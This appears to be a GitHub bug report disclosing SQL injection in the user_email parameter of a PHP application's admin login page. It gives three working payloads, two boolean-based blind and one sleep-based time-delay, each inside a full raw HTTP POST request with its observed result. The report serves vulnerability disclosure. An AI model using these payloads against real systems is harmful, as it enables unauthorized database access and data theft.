BUG_Author: heitaoa999

Vulnerability File: /philosophy/admin/login.php

POST parameter 'user_email' exists SQL injection vulnerability

Payload1:user_email=a' rlike (select (case when (666=666) then 0x61 else 0x28 end))-- b&user_pass=b&btnLogin=

```
POST /philosophy/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 100
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/philosophy/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=erriivuolh0rb2ucknp2nmpolf
Connection: close

user_email=a' rlike (select (case when (666=666) then 0x61 else 0x28 end))-- b&user_pass=b&btnLogin=
```

boolean-based blind return correct

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/sql1.png)

Payload2:user_email=a' rlike (select (case when (666=555) then 0x61 else 0x28 end))-- b&user_pass=b&btnLogin=

```
POST /philosophy/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 100
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/philosophy/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=erriivuolh0rb2ucknp2nmpolf
Connection: close

user_email=a' rlike (select (case when (666=555) then 0x61 else 0x28 end))-- b&user_pass=b&btnLogin=
```

boolean-based blind return an error

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/sql2.png)

Payload3:user_email=a' and (select 1 from (select(sleep(20)))a)-- a&user_pass=b&btnLogin=

```
POST /philosophy/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 80
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/philosophy/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=erriivuolh0rb2ucknp2nmpolf
Connection: close

user_email=a' and (select 1 from (select(sleep(20)))a)-- a&user_pass=b&btnLogin=
```

The server response time is 20 seconds

![image](https://github.com/heitaoa999/bug_report/blob/main/pictures/sql3.png)
